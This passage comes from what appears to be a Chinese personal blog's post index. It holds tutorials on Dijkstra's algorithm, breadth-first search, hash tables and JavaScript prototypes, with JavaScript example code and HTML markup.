class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (startPointData.length == <span class="number">0</span>) &#123;</span><br><span class="line">      initData[startPoint].start = startPoint <span class="comment">//给他一个名字</span></span><br><span class="line">      <span class="keyword">return</span> initData[startPoint]</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      startPointData = sortData(startPointData) <span class="comment">//排序</span></span><br><span class="line">      <span class="comment">// 遍历更新数据</span></span><br><span class="line">      <span class="keyword">for</span> (next <span class="keyword">in</span> initData[startPointData[<span class="number">0</span>].target]) &#123;</span><br><span class="line">        <span class="comment">// 排除掉绕圈</span></span><br><span class="line">        <span class="keyword">if</span> (next != startPoint) &#123;</span><br><span class="line">          <span class="comment">// 更新掉initData的数据</span></span><br><span class="line">          longer(initData, startPoint, startPointData[<span class="number">0</span>].target, next)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      startPointData.shift() <span class="comment">//移除当前数据</span></span><br><span class="line">      <span class="comment">// 继续迭代</span></span><br><span class="line">      <span class="keyword">return</span> analyse()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li>将结果进行描述的函数，在这里对于算法来说没啥用处，主要就是结果的文字展示</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 途径函数，传入算法计算结果的数据，以及要到达的终点，返回文字提示</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">roadPoint</span>(<span class="params">data, end</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!data[end]) <span class="keyword">return</span> <span class="string">'无到达该点的最短距离数据'</span></span><br><span class="line">  <span class="keyword">let</span> pass = [end]</span><br><span class="line">  <span class="keyword">let</span> instanceText = <span class="string">'从'</span> + data.start + <span class="string">'到'</span> + end + <span class="string">'的距离为'</span> + data[end].instance</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 迭代</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">get</span> = function(end) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data[end].process == data.start) &#123;</span><br><span class="line">      pass.unshift(data.start)</span><br><span class="line">      <span class="keyword">return</span> instanceText + <span class="string">',完整路径为'</span> + pass</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      pass.unshift(data[end].process)</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">get</span>(data[end].process)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)(end)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>拿前面的数据进行测试</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res1 = dijkstra(data, <span class="string">'a'</span>, [<span class="string">'d'</span>, <span class="string">'c'</span>, <span class="string">'e'</span>, <span class="string">'b'</span>])</span><br><span class="line"><span class="built_in">console</span>.log(res1)</span><br><span class="line"><span class="keyword">let</span> res1Text = roadPoint(res1, <span class="string">'e'</span>) <span class="comment">//文字描述</span></span><br><span class="line"><span class="built_in">console</span>.log(res1Text);</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src= "/img/loading.gif" data-src="/2021/10/06/%E7%8B%84%E5%85%8B%E6%96%AF%E7%89%B9%E6%8B%89%E7%AE%97%E6%B3%95/image-20220219164513219.png" alt="image-20220219164513219"></p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化单个数据的散列表</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params">data, startPoint, targetPoint</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = &#123;&#125;</span><br><span class="line">    <span class="comment">// 初始化每条数据，默认距离为无穷大，上一节点为起始点startPoint</span></span><br><span class="line">  targetPoint.forEach(<span class="function"><span class="params">i</span> =&gt;</span> &#123;</span><br><span class="line">      res[i] = &#123;</span><br><span class="line">        instance: <span class="number">99999</span>,</span><br><span class="line">        process: startPoint,</span><br><span class="line">        target: i</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// 遍历数据，赋值已有最近临点初始距离</span></span><br><span class="line">  data.forEach(<span class="function"><span class="params">i</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (res[i[<span class="number">1</span>]] &amp;&amp; i[<span class="number">0</span>] == startPoint) &#123;</span><br><span class="line">      res[i[<span class="number">1</span>]].instance = i[<span class="number">2</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  res[startPoint] &amp;&amp; <span class="keyword">delete</span> res[startPoint] <span class="comment">//删除起点（无用）</span></span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 建立全部数据的散列表</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pointDistanceHashTable</span>(<span class="params">data, targetPoint</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = &#123;&#125;</span><br><span class="line">    <span class="comment">// 对所有点进行遍历并初始化</span></span><br><span class="line">  targetPoint.forEach(<span class="function">(<span class="params">i, index</span>) =&gt;</span> &#123;</span><br><span class="line">    res[i] = init(data, i, targetPoint)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对比两者距离长度，会改变data，返回最新结果</span></span><br><span class="line"><span class="comment">// 参数：数据initData, 起点名称，当前点名称，终点名称</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">longer</span>(<span class="params">initData, start, pass, end</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> newDistance = initData[start][pass].instance + initData[pass][end].instance</span><br><span class="line">  <span class="keyword">if</span> (newDistance &lt; initData[start][end].instance) &#123;</span><br><span class="line">    initData[start][end].instance = newDistance</span><br><span class="line">    initData[start][end].process = pass</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> initData[start]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按距离从小到大进行排序，传入对象（数组），返回数组，会改变原数据</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortData</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!(data <span class="keyword">instanceof</span> <span class="built_in">Array</span>)) &#123;</span><br><span class="line">    <span class="keyword">let</span> arr = []</span><br><span class="line">    <span class="keyword">for</span> (key <span class="keyword">in</span> data) &#123;</span><br><span class="line">      arr.push(data[key])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> a.instance - b.instance</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> data.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a.instance - b.instance</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 迪杰斯特拉</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dijkstra</span>(<span class="params">data, startPoint, targetPoint</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> allPoint = <span class="keyword">new</span> <span class="built_in">Set</span>([...targetPoint, startPoint])</span><br><span class="line">    <span class="comment">// 获取全部点的散列表</span></span><br><span class="line">  <span class="keyword">let</span> initData = pointDistanceHashTable(data, allPoint);</span><br><span class="line">  <span class="comment">// 将起点单独提取出来，用于遍历, 大小比较</span></span><br><span class="line">  <span class="keyword">let</span> startPointData = initData[startPoint];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 按初始路径长短顺序进行路径分析</span></span><br><span class="line">  <span class="keyword">return</span> (analyse = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (startPointData.length == <span class="number">0</span>) &#123;</span><br><span class="line">      initData[startPoint].start = startPoint <span class="comment">//给他一个名字</span></span><br><span class="line">      <span class="keyword">return</span> initData[startPoint]</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      startPointData = sortData(startPointData) <span class="comment">//排序</span></span><br><span class="line">      <span class="comment">// 遍历更新数据</span></span><br><span class="line">      <span class="keyword">for</span> (next <span class="keyword">in</span> initData[startPointData[<span class="number">0</span>].target]) &#123;</span><br><span class="line">        <span class="comment">// 排除掉绕圈</span></span><br><span class="line">        <span class="keyword">if</span> (next != startPoint) &#123;</span><br><span class="line">          <span class="comment">// 更新掉initData的数据</span></span><br><span class="line">          longer(initData, startPoint, startPointData[<span class="number">0</span>].target, next)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      startPointData.shift() <span class="comment">//移除当前数据</span></span><br><span class="line">      <span class="comment">// 继续迭代</span></span><br><span class="line">      <span class="keyword">return</span> analyse()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 途径函数，传入算法计算结果的数据，以及要到达的终点，返回文字提示</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">roadPoint</span>(<span class="params">data, end</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!data[end]) <span class="keyword">return</span> <span class="string">'无到达该点的最短距离数据'</span></span><br><span class="line">  <span class="keyword">let</span> pass = [end]</span><br><span class="line">  <span class="keyword">let</span> instanceText = <span class="string">'从'</span> + data.start + <span class="string">'到'</span> + end + <span class="string">'的距离为'</span> + data[end].instance</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 迭代</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">get</span> = function(end) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data[end].process == data.start) &#123;</span><br><span class="line">      pass.unshift(data.start)</span><br><span class="line">      <span class="keyword">return</span> instanceText + <span class="string">',完整路径为'</span> + pass</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      pass.unshift(data[end].process)</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">get</span>(data[end].process)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)(end)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>要计算非加权图中的最短路径，可使用广度优先搜索。要计算加权图中的最短路径，可使用狄克斯特拉算法</li><li>狄克斯特拉算法用于在加权图中查找最短路径。 </li><li>仅当权重为正时狄克斯特拉算法才管用。 </li><li>如果图中包含负权边，请使用贝尔曼福德算法。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>广度优先搜索</title>
      <link href="/2021/10/01/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/"/>
      <url>/2021/10/01/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>宽度优先<a href="https://baike.baidu.com/item/搜索算法/2988274" target="_blank" rel="noopener">搜索算法</a>（又称广度优先搜索）是最简便的图的搜索算法之一，这一算法也是很多重要的图的算法的原型。Dijkstra<a href="https://baike.baidu.com/item/单源最短路径/6975204" target="_blank" rel="noopener">单源最短路径</a>算法和Prim<a href="https://baike.baidu.com/item/最小生成树" target="_blank" rel="noopener">最小生成树</a>算法都采用了和宽度优先搜索类似的思想。其别名又叫BFS，属于一种盲目搜寻法，目的是系统地展开并检查图中的所有节点，以找寻结果。换句话说，它并不考虑结果的可能位置，彻底地搜索整张图，直到找到结果为止</p></blockquote><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><p>广度优先搜索的运行时间为O(顶点 + 边数)，这通常写作O(V + E)，其中V为顶点（vertice）数，E为边数</p><p>对于检查过的人（顶点），务必不要再去检查，否则可能导致无限循环</p><h2 id="主要步骤"><a href="#主要步骤" class="headerlink" title="主要步骤"></a>主要步骤</h2><ol><li>使用图来建立问题模型</li><li>使用广度优先搜索解决问题</li></ol><h2 id="有向图、无向图"><a href="#有向图、无向图" class="headerlink" title="有向图、无向图"></a>有向图、无向图</h2><p>有向图是单向的</p><p><img src= "/img/loading.gif" data-src="/2021/10/01/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/image-20210904144514052.png" alt="image-20210904144514052"></p><p>无向图没有箭头，直接相连的节点互为邻居，无向图相邻的两个结点彼此指向对方，其实就是一个环，跟上图一样</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>有这么一个人员数据表，他们都有各自的<strong>职业</strong>和<strong>邻居</strong>，假设你是其中一个人：a——工地搬砖工。有一天，你想吃新鲜的蔬菜，但是你不相信陌生人，所以你打算问你的邻居，看看有没有什么认识的人（职业为农民）可以提供保证新鲜的蔬菜给你，如何操作呢（下面为思路）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  a: &#123;</span><br><span class="line">    neighbor: [<span class="string">'b'</span>, <span class="string">'c'</span>],</span><br><span class="line">    profession: <span class="string">'worker'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  b: &#123;</span><br><span class="line">    neighbor: [<span class="string">'a'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>],</span><br><span class="line">    profession: <span class="string">'panter'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  c: &#123;</span><br><span class="line">    neighbor: [<span class="string">'a'</span>, <span class="string">'f'</span>, <span class="string">'d'</span>],</span><br><span class="line">    profession: <span class="string">'teacher'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  d: &#123;</span><br><span class="line">    neighbor: [<span class="string">'c'</span>, <span class="string">'e'</span>],</span><br><span class="line">    profession: <span class="string">'doctor'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  e: &#123;</span><br><span class="line">    neighbor: [<span class="string">'d'</span>],</span><br><span class="line">    profession: <span class="string">'police'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  f: &#123;</span><br><span class="line">    neighbor: [<span class="string">'b'</span>, <span class="string">'c'</span>],</span><br><span class="line">    profession: <span class="string">'farmer'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  g: &#123;</span><br><span class="line">    neighbor: [<span class="string">'b'</span>],</span><br><span class="line">    profession: <span class="string">'programmer'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>根据广度优先搜素算法，我们首先根据各个人员的邻居构建出图模型</p><p><img src= "/img/loading.gif" data-src="/2021/10/01/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/image-20210904145548745.png" alt="image-20210904145548745"></p><p>接着就是从你（a）自己入手，首先你从b和c开始找起，如若b和c就是农民，那么久返回该对象的名字,我们可以将这两人压入待查找数组</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[b,c];</span><br></pre></td></tr></table></figure><p>b如果不是，那么就把b的邻居加入数组，一起找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[b,c,a,f,g];</span><br></pre></td></tr></table></figure><p>同时把b弹出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[c,a,f,g];</span><br></pre></td></tr></table></figure><p>当然，a也不是，否则查找会造成循环，不断去找a，所以一开始我们需要定义一个数组用以存储已查过的对象，然后每次查完一个放进一个，后面的每次查找待找数组时在已查找数组中查看是否已查过，是则把该值从待找数组中丢掉</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> finded = [<span class="string">'a'</span>];</span><br></pre></td></tr></table></figure><p>继续上面几个步骤，对后面的数据进行查找↓</p><p>接下来是c，c也不是，所以把c的邻居也加进来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[a,f,g,a,f,d];</span><br></pre></td></tr></table></figure><p>重复这几个步骤，直到找出最终的结果</p><p>方法代码如下</p><p><img src= "/img/loading.gif" data-src="/2021/10/01/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/carbon.png" alt="carbon"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>广度优先搜索指出是否有从A到B的路径。</li><li>如果有，广度优先搜索将找出最短路径。</li><li>面临类似于寻找最短路径的问题时，可尝试使用图来建立模型，再使用广度优先搜索来 解决问题。</li><li>有向图中的边为箭头，箭头的方向指定了关系的方向，例如，rama→adit表示rama欠adit钱。 </li><li>无向图中的边不带箭头，其中的关系是双向的，例如，ross - rachel表示“ross与rachel约 会，而rachel也与ross约会”。</li><li>队列是先进先出（FIFO）的。 </li><li>栈是后进先出（LIFO）的。</li><li>你需要按加入顺序检查搜索列表中的人，否则找到的就不是最短路径，因此搜索列表必 须是队列。 </li><li>对于检查过的人，务必不要再去检查，否则可能导致无限循环。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>散列表</title>
      <link href="/2021/08/30/%E6%95%A3%E5%88%97%E8%A1%A8/"/>
      <url>/2021/08/30/%E6%95%A3%E5%88%97%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>必看：<a href="https://zhuanlan.zhihu.com/p/95156642" target="_blank" rel="noopener">来吧！一文彻底搞定哈希表！</a></p><p>进阶：<a href="https://baike.baidu.com/item/哈希表/5981869?fr=aladdin" target="_blank" rel="noopener">哈希表_百度百科 (baidu.com)</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p><a href="https://baike.baidu.com/item/散列表/10027933" target="_blank" rel="noopener">散列表</a>（Hash table，也叫哈希表），是根据关键码值(Key value)而直接进行访问的<a href="https://baike.baidu.com/item/数据结构/1450" target="_blank" rel="noopener">数据结构</a>。也就是说，它通过把关键码值映射到表中一个位置来访问记录，以加快查找的速度。这个映射函数叫做<a href="https://baike.baidu.com/item/散列函数/2366288" target="_blank" rel="noopener">散列函数</a>，存放记录的<a href="https://baike.baidu.com/item/数组/3794097" target="_blank" rel="noopener">数组</a>叫做<a href="https://baike.baidu.com/item/散列表/10027933" target="_blank" rel="noopener">散列表</a>。</p><p>给定表M，存在函数f(key)，对任意给定的关键字值key，代入函数后若能得到包含该关键字的记录在表中的地址，则称表M为哈希(Hash）表，函数f(key)为哈希(Hash) 函数。</p></blockquote><p><img src= "/img/loading.gif" data-src="/2021/08/30/%E6%95%A3%E5%88%97%E8%A1%A8/image-20210904161554231.png" alt="image-20210904161554231"></p><h3 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h3><ul><li>一种功能强大的数据结构，其操作速度快，还能以不同的方式建立数据模型</li><li>一种包含额外逻辑的数据结构</li><li>也被称为散列映射、映射、字典和<br>关联数组</li><li>散列表的查找、插入和删除速度都非常快</li></ul><h3 id="应用："><a href="#应用：" class="headerlink" title="应用："></a>应用：</h3><ul><li>查找（模拟映射关系）</li><li>防止重复</li><li>用作缓存</li></ul><h3 id="冲突"><a href="#冲突" class="headerlink" title="冲突"></a>冲突</h3><h4 id="什么是冲突"><a href="#什么是冲突" class="headerlink" title="什么是冲突"></a>什么是冲突</h4><p><img src= "/img/loading.gif" data-src="/2021/08/30/%E6%95%A3%E5%88%97%E8%A1%A8/image-20220216142535367.png" alt="image-20220216142535367"></p><blockquote><p>冲突很糟糕，应使用可以最大限度减少冲突的散列函数</p></blockquote><p>避免方法：</p><ol><li>较低的填装因子<ul><li>填装因子越低，发生冲突的可能性越小，<br>散列表的性能越高</li><li>经验：一旦填装因子大于0.7，就调整散列表的长度</li><li>虑到调整长度所需的时间，散列表操作所需的时间也为O(1)</li></ul></li><li>良好的散列函数<ul><li>良好的散列函数让数组中的值呈均匀分布</li><li>糟糕的散列函数让值扎堆，导致大量的冲突</li><li>散列函数的结果必须是均匀分布的，这很重要。它们的映射范围必须尽可能大。最糟糕的散列函数莫过于将所有输入都映射到散列表的同一个位置</li></ul></li></ol><h2 id="散列函数"><a href="#散列函数" class="headerlink" title="散列函数"></a>散列函数</h2><ol><li>散列函数总是将同样的输入映射到相同的索引。</li><li>散列函数将不同的输入映射到不同的索引。</li><li>散列函数知道数组有多大，只返回有效的索引。如果数组包含5个元素，散列函数就不会返回无效索引100</li></ol><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><h3 id="伪散列函数查找商品价格"><a href="#伪散列函数查找商品价格" class="headerlink" title="伪散列函数查找商品价格"></a>伪散列函数查找商品价格</h3><p>功能：</p><ol><li>添加商品及其价格</li><li>输入商品，得到其价格</li></ol><p>思路：</p><ol><li>使用类存储</li><li>获取商品价格方法<ul><li>通过遍历已有商品得到其价格并返回出去</li></ul></li><li>添加商品方法<ul><li>通过添加商品将该数据添加到对象中</li></ul></li></ol><p><img src= "/img/loading.gif" data-src="/2021/08/30/%E6%95%A3%E5%88%97%E8%A1%A8/6130935fe401fd1fb6a2dfb5.png" alt="6130935fe401fd1fb6a2dfb5"></p><h3 id="模拟散列表"><a href="#模拟散列表" class="headerlink" title="模拟散列表"></a>模拟散列表</h3><p>该散列表默认按照最高长度为24来进行字符串存储</p><p>slots用于初始化散列表时的数据存储</p><ul><li>add方法<ul><li>得到当前传入值的字符串长度</li><li>判断当前长度对应的数组位置是否还未开辟出新的数组，是则开辟出新的内存地址</li><li>将当前字符串添加到散列表（slots）中去</li></ul></li><li>delete方法<ul><li>从散列表中查找该字符串长度对应的数组位置</li><li>获得该元素在该数组（对应字符串长度的数组）中的<strong>位置</strong></li><li>将该数据从散列表中数组对应的位置删除</li></ul></li><li>get方法<ul><li>通过<strong>过滤函数（filter）</strong>将数据从散列表中取出来，并返回该值</li></ul></li></ul><p><img src= "/img/loading.gif" data-src="/2021/08/30/%E6%95%A3%E5%88%97%E8%A1%A8/613095421efad40d9391d4ad.png" alt="613095421efad40d9391d4ad"></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js原型小记（大记）</title>
      <link href="/2021/08/22/%E5%8E%9F%E5%9E%8B/"/>
      <url>/2021/08/22/%E5%8E%9F%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="原型、原型链、-proto-、prototype"><a href="#原型、原型链、-proto-、prototype" class="headerlink" title="原型、原型链、__proto__、prototype"></a>原型、原型链、__proto__、prototype</h1><blockquote><p>在以类为中心的面向对象编程语言中，类和对象的关系可以想象成铸模和铸件的关系，对象总是从类中创建而来。而在原型编程的思想中，类并不是必需的，对象未必需要从类中创建而来，一个对象是通过克隆另外一个对象所得到的。</p></blockquote><p>也就是说，在js中，我们是可以通过克隆创造世界，看下面的代码，首先我们创建一个构造函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> User = <span class="function"><span class="keyword">function</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name,</span><br><span class="line">  <span class="keyword">this</span>.age = age,</span><br><span class="line">  <span class="keyword">this</span>.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，我们声明了一个构造函数，暂且将它想象成类，然后我们来new一个对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> admin = <span class="keyword">new</span> User(<span class="string">'Admin'</span>, <span class="number">18</span>)</span><br></pre></td></tr></table></figure><p>我们创造了一个admin对象，接着，如果有一个admin和上面所创造的对象同名同年龄时，我们该怎么创建呢，有人说：这还不简单嘛，再new一个不就得了，确实，在这里new一个难度不大，但当我们构造同一个对象需要的参数很多时，那又该怎么办，按着原来的参数继续new吗</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> User = <span class="function"><span class="keyword">function</span>(<span class="params">name, age, height, weigt</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name,</span><br><span class="line">  <span class="keyword">this</span>.age = age,</span><br><span class="line">  <span class="keyword">this</span>.height = height,</span><br><span class="line">  <span class="keyword">this</span>.weight = weight,</span><br><span class="line">  <span class="comment">//... 还有其它很多的属性</span></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 已经创建了一个对象</span></span><br><span class="line"><span class="keyword">let</span> admin = <span class="keyword">new</span> 